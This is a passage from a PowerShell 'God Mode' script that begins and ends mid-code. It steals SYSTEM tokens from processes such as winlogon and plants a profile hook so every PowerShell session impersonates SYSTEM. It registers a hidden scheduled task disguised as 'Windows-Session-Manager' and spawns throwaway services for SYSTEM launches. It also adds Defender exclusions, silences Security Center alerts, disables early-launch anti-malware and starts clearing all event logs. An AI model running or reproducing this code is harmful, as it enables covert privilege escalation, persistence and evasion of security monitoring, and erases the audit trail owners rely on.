                if ([TokenOps]::SetThreadToken([IntPtr]::Zero, $hImpToken)) {
                    $script:__SystemImpersonationToken = $hImpToken
                    $script:__SystemImpersonationActive = $true
                    $currentName = [Security.Principal.WindowsIdentity]::GetCurrent().Name
                    Write-Host "[SUCCESS] SYSTEM impersonation enabled on current thread." -ForegroundColor Green
                    Write-Host "[INFO] Current identity: $currentName" -ForegroundColor Cyan
                    return $true
                } else {
                    [TokenOps]::CloseHandle($hImpToken)
                    Write-Host "[ERROR] SetThreadToken failed." -ForegroundColor Red
                    return $false
                }
            } finally {
                [TokenOps]::CloseHandle($hToken)
            }
        } finally {
            [TokenOps]::CloseHandle($hProcess)
        }
    } catch {
        Write-Host "[ERROR] Exception during SYSTEM impersonation: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Disable-SystemImpersonation {
    if ($script:__SystemImpersonationActive) {
        [TokenOps]::SetThreadToken([IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
        if ($script:__SystemImpersonationToken -ne [IntPtr]::Zero) {
            [TokenOps]::CloseHandle($script:__SystemImpersonationToken) | Out-Null
            $script:__SystemImpersonationToken = [IntPtr]::Zero
        }
        $script:__SystemImpersonationActive = $false
        $currentName = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        Write-Host "[SUCCESS] SYSTEM impersonation disabled. Reverted to original token." -ForegroundColor Green
        Write-Host "[INFO] Current identity: $currentName" -ForegroundColor Cyan
    } else {
        Write-Host "[INFO] SYSTEM impersonation is not currently active." -ForegroundColor Yellow
    }
}

function Invoke-ProcessTokenReplacement {
    param([int]$SourcePid = 0)
    Enable-ElevationPrivileges
    Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
    if ($SourcePid -eq 0) {
        $SourcePid = Find-SystemProcessCandidate
    }
    if ($SourcePid -eq 0) {
        Write-Host "[ERROR] No SYSTEM process found for token replacement." -ForegroundColor Red
        return $false
    }
    Write-Host "[INFO] Attempting in-place process token replacement via NtSetInformationProcess (experimental)..." -ForegroundColor Cyan
    $result = [TokenOps]::ReplaceProcessToken($SourcePid)
    if ($result) {
        $currentName = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        Write-Host "[SUCCESS] Process token replaced with SYSTEM token." -ForegroundColor Green
        Write-Host "[INFO] Current identity: $currentName" -ForegroundColor Cyan
        Write-Host "[WARN] NtSetInformationProcess is undocumented and may cause instability." -ForegroundColor Yellow
    } else {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[ERROR] Token replacement failed. Win32 error: $err" -ForegroundColor Red
    }
    return $result
}

function Install-PersistentSystemImpersonation {
    Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "ENTRY"
    try {
        $ProfilePath = $PROFILE.CurrentUserAllHosts
        if (-not $ProfilePath) {
            $ProfilePath = Join-Path $env:USERPROFILE "Documents\WindowsPowerShell\Profile.ps1"
        }
        $ProfileDir = Split-Path -Parent $ProfilePath
        if (-not (Test-Path $ProfileDir)) {
            New-Item -ItemType Directory -Path $ProfileDir -Force | Out-Null
        }

        $HookContent = @'
# <GODMODE_PERSISTENT_IMPERSONATION>
# Auto-enable SYSTEM impersonation on every PowerShell startup. Baked into God Mode.
if ($env:USERNAME -ne "SYSTEM") {
    try {
        $TokenOpsType = @"
using System;
using System.Runtime.InteropServices;
public class TokenOpsMini {
    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
    public const int SecurityImpersonation = 2;
    public const int TokenImpersonation = 2;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public struct LUID { public uint LowPart; public int HighPart; }
    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)] public LUID_AND_ATTRIBUTES[] Privileges; }
    public static bool EnablePrivilege(string privilegeName) {
        IntPtr hToken = IntPtr.Zero;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;
        try {
            LUID luid; if (!LookupPrivilegeValue(null, privilegeName, out luid)) return false;
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new LUID_AND_ATTRIBUTES[3] };
            tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            bool ok = AdjustTokenPrivileges(hToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
            return ok && Marshal.GetLastWin32Error() == 0;
        } finally { CloseHandle(hToken); }
    }
}
"@
        Add-Type -TypeDefinition $TokenOpsType -ErrorAction SilentlyContinue | Out-Null
        [TokenOpsMini]::EnablePrivilege("SeDebugPrivilege") | Out-Null
        [TokenOpsMini]::EnablePrivilege("SeImpersonatePrivilege") | Out-Null
        $systemPid = 0
        $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
        foreach ($name in @("winlogon.exe","dwm.exe","fontdrvhost.exe")) {
            foreach ($proc in ($allProcs | Where-Object { $_.Name -eq $name -and $_.SessionId -eq 1 })) {
                try {
                    $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                    if ($owner -eq "SYSTEM") {
                        $hProc = [TokenOpsMini]::OpenProcess([TokenOpsMini]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $proc.ProcessId)
                        if ($hProc -ne [IntPtr]::Zero) {
                            $hToken = [IntPtr]::Zero
                            if ([TokenOpsMini]::OpenProcessToken($hProc, [TokenOpsMini]::TOKEN_DUPLICATE -bor [TokenOpsMini]::TOKEN_QUERY, [ref]$hToken)) {
                                $hImp = [IntPtr]::Zero
                                if ([TokenOpsMini]::DuplicateTokenEx($hToken, [TokenOpsMini]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOpsMini]::SecurityImpersonation, [TokenOpsMini]::TokenImpersonation, [ref]$hImp)) {
                                    if ([TokenOpsMini]::SetThreadToken([IntPtr]::Zero, $hImp)) { $systemPid = $proc.ProcessId; [TokenOpsMini]::CloseHandle($hToken); [TokenOpsMini]::CloseHandle($hProc); break }
                                    [TokenOpsMini]::CloseHandle($hImp)
                                }
                                [TokenOpsMini]::CloseHandle($hToken)
                            }
                            [TokenOpsMini]::CloseHandle($hProc)
                        }
                    }
                } catch {}
                if ($systemPid -ne 0) { break }
            }
            if ($systemPid -ne 0) { break }
        }
        if ($systemPid -eq 0) {
            foreach ($proc in ($allProcs | Where-Object { $_.ProcessId -gt 4 -and $_.Name -notin @("System","Registry","smss.exe","csrss.exe","wininit.exe","lsass.exe","MsMpEng.exe") } | Sort-Object SessionId -Descending)) {
                try {
                    $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                    if ($owner -eq "SYSTEM") {
                        $hProc = [TokenOpsMini]::OpenProcess([TokenOpsMini]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $proc.ProcessId)
                        if ($hProc -ne [IntPtr]::Zero) {
                            $hToken = [IntPtr]::Zero
                            if ([TokenOpsMini]::OpenProcessToken($hProc, [TokenOpsMini]::TOKEN_DUPLICATE -bor [TokenOpsMini]::TOKEN_QUERY, [ref]$hToken)) {
                                $hImp = [IntPtr]::Zero
                                if ([TokenOpsMini]::DuplicateTokenEx($hToken, [TokenOpsMini]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOpsMini]::SecurityImpersonation, [TokenOpsMini]::TokenImpersonation, [ref]$hImp)) {
                                    if ([TokenOpsMini]::SetThreadToken([IntPtr]::Zero, $hImp)) { $systemPid = $proc.ProcessId; [TokenOpsMini]::CloseHandle($hToken); [TokenOpsMini]::CloseHandle($hProc); break }
                                    [TokenOpsMini]::CloseHandle($hImp)
                                }
                                [TokenOpsMini]::CloseHandle($hToken)
                            }
                            [TokenOpsMini]::CloseHandle($hProc)
                        }
                    }
                } catch {}
                if ($systemPid -ne 0) { break }
            }
        }
    } catch {}
}
# </GODMODE_PERSISTENT_IMPERSONATION>
'@

        if (-not (Test-Path $ProfilePath)) {
            New-Item -ItemType File -Path $ProfilePath -Force | Out-Null
        }
        $existing = Get-Content -Path $ProfilePath -Raw -ErrorAction SilentlyContinue
        if ($existing -and $existing.Contains("GODMODE_PERSISTENT_IMPERSONATION")) {
            Write-Host "[INFO] Persistent SYSTEM impersonation profile hook is already installed." -ForegroundColor Yellow
            Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "EXIT" -Message "Already installed."
            return
        }
        Add-Content -Path $ProfilePath -Value $HookContent -Encoding UTF8 -ErrorAction Stop
        Write-Host "[SUCCESS] Persistent SYSTEM impersonation installed." -ForegroundColor Green
        Write-Host "[INFO] Every new PowerShell window will now auto-impersonate SYSTEM." -ForegroundColor Cyan
        # Also immediately enable full system-wide God Mode so all programs
        # and services are elevated without waiting for a reboot.
        Write-Host "[INFO] Launching system-wide God Mode elevation for all processes..." -ForegroundColor Cyan
        Enable-GodMode
        Write-Host "[SUCCESS] System-wide elevation active. All processes now run as SYSTEM." -ForegroundColor Green
        Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "EXIT" -Message "Success with system-wide God Mode enabled"
    } catch {
        Write-Host "[ERROR] Failed to install persistent SYSTEM impersonation: $($_.Exception.Message)" -ForegroundColor Red
        Write-DebugLog -FunctionName "Install-PersistentSystemImpersonation" -Action "ERROR" -Message "Failed to install" -ErrorRecord $_
    }
}

function Uninstall-PersistentSystemImpersonation {
    Write-DebugLog -FunctionName "Uninstall-PersistentSystemImpersonation" -Action "ENTRY"
    try {
        $ProfilePath = $PROFILE.CurrentUserAllHosts
        if (-not $ProfilePath) {
            $ProfilePath = Join-Path $env:USERPROFILE "Documents\WindowsPowerShell\Profile.ps1"
        }
        if (-not (Test-Path $ProfilePath)) {
            Write-Host "[INFO] No profile found. Nothing to uninstall." -ForegroundColor Yellow
            return
        }
        $content = Get-Content -Path $ProfilePath -Raw -ErrorAction SilentlyContinue
        if (-not $content -or -not $content.Contains("GODMODE_PERSISTENT_IMPERSONATION")) {
            Write-Host "[INFO] Persistent SYSTEM impersonation profile hook not found." -ForegroundColor Yellow
            return
        }
        $pattern = '(?s)# <GODMODE_PERSISTENT_IMPERSONATION>.*# </GODMODE_PERSISTENT_IMPERSONATION>'
        $cleaned = [regex]::Replace($content, $pattern, "").Trim()
        if ($cleaned) {
            Set-Content -Path $ProfilePath -Value $cleaned -Encoding UTF8 -Force
        } else {
            Remove-Item -Path $ProfilePath -Force -ErrorAction SilentlyContinue
        }
        Write-Host "[SUCCESS] Persistent SYSTEM impersonation uninstalled." -ForegroundColor Green
        Write-DebugLog -FunctionName "Uninstall-PersistentSystemImpersonation" -Action "EXIT" -Message "Success"
    } catch {
        Write-Host "[ERROR] Failed to uninstall persistent SYSTEM impersonation: $($_.Exception.Message)" -ForegroundColor Red
        Write-DebugLog -FunctionName "Uninstall-PersistentSystemImpersonation" -Action "ERROR" -Message "Failed to uninstall" -ErrorRecord $_
    }
}

function Test-PersistentSystemImpersonation {
    try {
        $ProfilePath = $PROFILE.CurrentUserAllHosts
        if (-not $ProfilePath) {
            $ProfilePath = Join-Path $env:USERPROFILE "Documents\WindowsPowerShell\Profile.ps1"
        }
        if (-not (Test-Path $ProfilePath)) { return $false }
        $content = Get-Content -Path $ProfilePath -Raw -ErrorAction SilentlyContinue
        return ($content -and $content.Contains("GODMODE_PERSISTENT_IMPERSONATION"))
    } catch {
        return $false
    }
}

function Start-SystemDesktopExplorer {
    param([int]$TargetSessionId = 1)
    try {
        Enable-ElevationPrivileges
        Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
        $winlogon = Get-CimInstance Win32_Process -Filter "Name='winlogon.exe' AND SessionId=$TargetSessionId" -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $winlogon) {
            Write-Host "[ERROR] winlogon.exe not found in Session $TargetSessionId" -ForegroundColor Red
            return $false
        }
        Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
        $result = [TokenOps]::CreateProcessAsSystem($winlogon.ProcessId, "C:\Windows\explorer.exe", "C:\Windows\explorer.exe", $false)
        if ($result -eq 0) {
            Write-Host "[SUCCESS] SYSTEM desktop explorer started in Session $TargetSessionId" -ForegroundColor Green
            return $true
        } else {
            $errMsg = Get-Win32ErrorRootCause -ErrorCode $result -Context "CreateProcessAsUser"
            Write-Host "[ERROR] CreateProcessAsSystem failed: $errMsg" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[ERROR] Exception: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Install-SystemDesktopSession {
    Write-DebugLog -FunctionName "Install-SystemDesktopSession" -Action "ENTRY"
    try {
        $taskName = "Windows-Session-Manager"
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -SystemDesktop"
        $trigger1 = New-ScheduledTaskTrigger -AtStartup
        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Principal $principal -Force | Out-Null
        $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
        if ($isSystem) {
            Start-SystemDesktopExplorer
        } else {
            $tempScript = Join-Path $env:TEMP "GodMode_SystemDesktop_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
            Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
            $result = Invoke-AsSystem -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -SystemDesktop" -MaxWaitSeconds 180
            Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
            if ($result.Success) {
                Write-Host "[SUCCESS] SYSTEM desktop explorer started via service elevation." -ForegroundColor Green
            } else {
                Write-Host "[WARN] Immediate elevation failed: $($result.Output). Desktop will elevate after next reboot/logon." -ForegroundColor Yellow
            }
        }
        Write-Host "[SUCCESS] SYSTEM desktop session installed. Task: $taskName" -ForegroundColor Green
        Write-Host "[INFO] Explorer will restart as SYSTEM at every logon and startup." -ForegroundColor Cyan
        Write-DebugLog -FunctionName "Install-SystemDesktopSession" -Action "EXIT" -Message "Success"
    } catch {
        Write-Host "[ERROR] Failed to install SYSTEM desktop session: $($_.Exception.Message)" -ForegroundColor Red
        Write-DebugLog -FunctionName "Install-SystemDesktopSession" -Action "ERROR" -Message "Failed" -ErrorRecord $_
    }
}

function Uninstall-SystemDesktopSession {
    try {
        $taskName = "Windows-Session-Manager"
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "[SUCCESS] SYSTEM desktop session uninstalled." -ForegroundColor Green
    } catch {
        Write-Host "[ERROR] Failed to uninstall SYSTEM desktop session: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Test-SystemDesktopSession {
    try {
        $taskName = "Windows-Session-Manager"
        $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        return ($null -ne $task)
    } catch {
        return $false
    }
}

function Start-ProcessWithService {
    param(
        [string]$Path,
        [string]$Arguments = "",
        [switch]$HideWindow
    )
    $TaskId = Get-Random -Minimum 10000 -Maximum 99999
    $ServiceName = "ElevateProc_$TaskId"
    $BatchFile = Join-Path $env:TEMP "ElevateProc_Batch_$TaskId.cmd"

    $batchArgs = if ($Arguments) { "`"$Path`" $Arguments" } else { "`"$Path`"" }

    # --- Session-correct launch via gmproxy (avoids ownerless Session-0 birth) ---
    # A Windows service runs as SYSTEM in Session 0. Launching a GUI app directly
    # from a Session-0 service (the old `start "" app` batch) births the child in
    # Session 0 -> ownerless, blank User column, no visible window (the Firefox /
    # Chrome "launches without user column" symptom). Routing the service through
    # gmproxy.exe fixes it: gmproxy runs AS the SYSTEM service (so it holds
    # SeTcbPrivilege), steals ANY SYSTEM token, and relocates it to the active
    # interactive session via SetTokenInformation(TokenSessionId) before
    # CreateProcessWithTokenW -> the child is born session-correct SYSTEM
    # (visible, User column = SYSTEM). If gmproxy is NOT installed, REFUSE to
    # birth an ownerless child: return $false so the caller (Monitor-ElevateProcess
    # / Invoke-HybridElevation) keeps the existing user-context process (graceful
    # degradation) instead of spawning an unusable Session-0 copy. Mirrors
    # gmproxy's own current-user fallback in driver/gmproxy.c.
    $GmProxyExe = Join-Path $GodModeInstallDir "gmproxy.exe"
    if (-not (Test-Path $GmProxyExe)) {
        Write-DebugLog -FunctionName "Start-ProcessWithService" -Action "WARN" -Message "gmproxy.exe not found at $GmProxyExe; refusing Session-0 service launch to avoid ownerless birth (graceful degradation). Target: $Path"
        return $false
    }
    # gmproxy takes argv[1]=target exe, argv[2+]=args; it reconstructs the child
    # command line itself (driver/gmproxy.c wmain), so pass the quoted target +
    # args verbatim. Direct invocation (no `start`) keeps the batch simple and
    # avoids `start` quoting quirks; gmproxy returns ~immediately after birthing
    # the child (it does not wait for the child to exit), so the 30s service poll
    # still completes promptly.
    $BatchContent = "@echo off`r`n`"$GmProxyExe`" $batchArgs`r`necho ___DONE___"
    Write-DebugLog -FunctionName "Start-ProcessWithService" -Action "INFO" -Message "Session-0 service routed through gmproxy for session-correct SYSTEM launch: $GmProxyExe $batchArgs"
    Set-Content -Path $BatchFile -Value $BatchContent -Encoding ASCII -Force

    try {
        sc.exe create $ServiceName binPath= "cmd.exe /c `"$BatchFile`"" start= demand | Out-Null
        if ($LASTEXITCODE -eq 0) {
            sc.exe start $ServiceName | Out-Null
            # Poll until service stops naturally or timeout (30s)
            $elapsed = 0
            $maxWait = 30
            while ($elapsed -lt $maxWait) {
                Start-Sleep -Milliseconds 500
                $elapsed++
                $svcInfo = sc.exe query $ServiceName 2>$null
                if ($svcInfo -match "STOPPED") { break }
            }
            if ($elapsed -ge $maxWait) {
                sc.exe stop $ServiceName | Out-Null
            }
            sc.exe delete $ServiceName | Out-Null
            Remove-Item $BatchFile -Force -ErrorAction SilentlyContinue
            return $true
        }
    } catch {}

    sc.exe stop $ServiceName | Out-Null
    sc.exe delete $ServiceName | Out-Null
    Remove-Item $BatchFile -Force -ErrorAction SilentlyContinue
    return $false
}

function Invoke-HybridElevation {
    param(
        [string]$Path,
        [string]$Arguments = ""
    )
    if (-not (Test-Path $Path)) {
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "ERROR" -Message "Target path does not exist: $Path" -RootCause "The executable file is missing or inaccessible. Verify the path and that the installer did not move it."
        return $false
    }
    $procName = [System.IO.Path]::GetFileNameWithoutExtension($Path)

    # Skip if an instance is already running as SYSTEM
    if (Test-SystemProcessExists -ProcessName "$procName.exe") {
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "$procName already running as SYSTEM. Skipping."
        return $true
    }

    Write-Log -Message "Hybrid elevating: $Path $Arguments" -Type "STEALTH" -Color Gray

    $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
    if ($isSystem) {
        Enable-ElevationPrivileges
        Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
        $systemPid = Find-SystemProcessCandidate
        if ($systemPid -ne 0) {
            $cmdLine = if ($Arguments) { "`"$Path`" $Arguments" } else { "`"$Path`"" }
            Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "Phase 0: Direct CreateProcessAsSystem for $procName"
            $result = [TokenOps]::CreateProcessAsSystem($systemPid, $Path, $cmdLine, $false)
            if ($result -eq 0) {
                Write-Log -Message "Direct SYSTEM elevation succeeded for $procName" -Type "INFO" -Color Green
                return $true
            }
        }
    }

    # --- Phase 1: Service elevation ---
    Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "Phase 1: Service-elevation attempt for $procName"
    $elevated = Start-ProcessWithService -Path $Path -Arguments $Arguments -HideWindow
    if ($elevated) {
        Write-Log -Message "Service-elevation succeeded for $procName" -Type "INFO" -Color Green
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "EXIT" -Message "Phase 1 succeeded for $procName"
        return $true
    }

    Write-Log -Message "Service-elevation failed for $procName, falling back to scheduled task..." -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "Phase 1 failed. Proceeding to Phase 2 (scheduled task)."

    # --- Phase 2: Scheduled task fallback (session-correct via gmproxy) ---
    # A scheduled task with -UserId "S-1-5-18" -LogonType ServiceAccount runs as
    # SYSTEM in Session 0 with no interactive desktop. Launching the GUI app
    # directly as the task action (the old method) births the child ownerless in
    # Session 0 -> blank User column, no visible window (the Firefox/Chrome
    # "launches without user column" symptom). Routing the task action through
    # gmproxy.exe fixes it: the task runs gmproxy AS SYSTEM (holds SeTcbPrivilege),
    # gmproxy steals a SYSTEM token and relocates it to the active interactive
    # session via SetTokenInformation(TokenSessionId) before
    # CreateProcessWithTokenW -> the child is born session-correct SYSTEM
    # (visible, User=SYSTEM). If gmproxy.exe is NOT installed, REFUSE to birth an
    # ownerless child: return $false so the caller keeps the existing user-context
    # process (graceful degradation). Mirrors Start-ProcessWithService +
    # driver/gmproxy.c (which also refuses ownerless Session-0 birth).
    $GmProxyExe = Join-Path $GodModeInstallDir "gmproxy.exe"
    if (-not (Test-Path $GmProxyExe)) {
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "WARN" -Message "Phase 2: gmproxy.exe not found at $GmProxyExe; refusing Session-0 scheduled-task launch to avoid ownerless birth (graceful degradation). Target: $Path"
        return $false
    }
    $taskArgs = if ($Arguments) { "`"$Path`" $Arguments" } else { "`"$Path`"" }
    try {
        $action = New-ScheduledTaskAction -Execute $GmProxyExe -Argument $taskArgs
        $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask

        $started = $false
        for ($i = 0; $i -lt 30; $i++) {
            Start-Sleep -Milliseconds 100
            $taskInfo = Get-ScheduledTask -TaskName $tempTask -ErrorAction SilentlyContinue
            if ($taskInfo -and $taskInfo.State -eq "Running") {
                $started = $true
                break
            }
        }

        Start-Sleep -Milliseconds 500
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null

        if (-not $started) {
            Write-Log -Message "Elevated task did not start: $Path" -Type "WARN" -Color Yellow
            Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "ERROR" -Message "Scheduled task fallback did not enter Running state for $Path" -RootCause "Task Scheduler may be disabled, the Task Scheduler service may be stopped, or the executable path is invalid for a service-account context."
            return $false
        }

        # --- Kill AFTER success (mirrors Monitor-ElevateProcess): only purge
        #     non-SYSTEM duplicates AFTER the SYSTEM child is confirmed alive.
        #     The old kill-before-launch (Get-Process|Stop-Process + 800ms sleep)
        #     left the user with NO app if gmproxy-as-task refused or the SYSTEM
        #     child lost the single-instance race -- the user app was already
        #     dead before the launch was even attempted. Killing after success
        #     avoids that: if no SYSTEM instance surfaces (gmproxy refused, the
        #     task did not actually birth a session-correct SYSTEM child, or a
        #     single-instance app's SYSTEM copy exited back to the still-alive
        #     user copy), we KEEP the existing user-context process (graceful
        #     degradation) instead of purging it -- strictly safer than
        #     kill-before. When a SYSTEM child IS confirmed, purge the user
        #     duplicate so only SYSTEM remains (same end state as the live
        #     monitor path). Wait briefly for the child to surface first.
        $systemAlive = $false
        for ($i = 0; $i -lt 10; $i++) {
            if (Test-SystemProcessExists -ProcessName "$procName.exe") { $systemAlive = $true; break }
            Start-Sleep -Milliseconds 200
        }
        if ($systemAlive) {
            Stop-NonSystemInstances -ProcessName "$procName.exe"
            Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "INFO" -Message "Phase 2: SYSTEM instance confirmed for $procName; purged non-SYSTEM duplicates (kill-after-success, mirrors Monitor-ElevateProcess)."
        } else {
            Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "WARN" -Message "Phase 2: no SYSTEM instance detected for $procName after task launch; keeping user-context process (graceful degradation, no purge -- avoids the old kill-before 'no app' state)."
        }
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "EXIT" -Message "Phase 2 succeeded for $procName"
        return $true
    } catch {
        Write-Log -Message "Failed to elevate: $Path | Exception: $($_.Exception.Message)" -Type "ERROR" -Color Red
        Write-DebugLog -FunctionName "Invoke-HybridElevation" -Action "ERROR" -Message "Phase 2 exception for $Path" -ErrorRecord $_
        return $false
    }
}

# --- Helper: Add Defender Exclusion ---
function Add-DefenderExclusion {
    param([string]$Path)
    try {
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
            Write-Log -Message "Defender exclusion added: $Path" -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Add-MpPreference not available; skipped Defender exclusion for $Path." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to add Defender exclusion for $Path`: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Safe Mode / Recovery ---
function Disable-RecoveryAndSafeMode {
    # Intentionally left empty to avoid boot-level conflicts in VirtualBox
    # Previous BCD edits caused BIOS logo hangs on reboot
    Write-Log -Message "BCD/WinRE modifications skipped (boot-safe mode)." -Type "INFO" -Color Gray
}

# --- Helper: Suppress Security Center Alerts ---
function Disable-SecurityAlerts {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Security Center alerts suppressed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to suppress security alerts: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Early Launch Anti-Malware ---
function Disable-ELAM {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -Value 3 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "ELAM boot driver policy disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable ELAM: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Disable Security Auditing / Clear Logs ---
function Disable-SecurityAuditing {
    try {
        # Boot-critical services (EventLog, CryptSvc) are NOT stopped to avoid boot hangs.
        # NOTE: a CLR-level access violation inside CreateProcess (e.g. from the gmhook
        # CreateProcessWithTokenW reroute) is NOT catchable here -- that is fixed in
        # gmhook.c. This try/catch only keeps wevtutil / log-clearing failures from
        # aborting the rest of Enable-DangerousMode.
        $Channels = $null
        try {
            $Channels = wevtutil el 2>$null
        } catch {
            Write-Log -Message "wevtutil el failed (event log enumeration unavailable): $_" -Type "WARN" -Color Yellow
        }
        if ($Channels) {
            # Normalize to a line array, skip empties, and clear per-channel so one bad
            # channel cannot abort the whole sequence (each wevtutil cl is its own process).
            $ChannelList = @($Channels | Where-Object { $_ -and $_.Trim().Length -gt 0 })
            $Cleared = 0
            $Failed = 0
            foreach ($ch in $ChannelList) {
                try {
                    & wevtutil cl "$ch" 2>$null | Out-Null
                    $Cleared++
                } catch {
                    $Failed++
                }
            }
